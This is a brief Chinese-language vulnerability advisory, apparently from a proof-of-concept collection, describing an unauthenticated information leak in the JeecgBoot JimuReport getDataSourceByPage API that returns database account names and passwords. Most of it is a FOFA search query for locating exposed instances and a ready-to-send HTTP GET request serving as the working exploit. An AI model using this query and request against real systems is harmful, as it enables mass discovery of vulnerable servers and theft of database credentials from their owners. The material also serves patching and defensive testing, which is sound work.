## JeecgBoot 积木报表 getDataSourceByPage 敏感信息泄露漏洞

## 漏洞描述
JeecgBoot 积木报表 `getDataSourceByPage` API 返回包含数据库连接信息的完整数据源配置，未授权攻击者可直接获取账号口令等敏感信息。

## 网络空间测绘
```
fofa: title=="JeecgBoot 企业级低代码平台" || body="window._CONFIG['imgDomainURL'] = 'http://localhost:8080/jeecg-boot/" || title="Jeecg-Boot 企业级快速开发平台" || body="'http://fileview.jeecg.com/onlinePreview'" || body="积木报表"
```

## POC
```
GET /jmreport/getDataSourceByPage HTTP/1.1
Host: [请补充实际域名]
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```

## 参考
- 社区情报

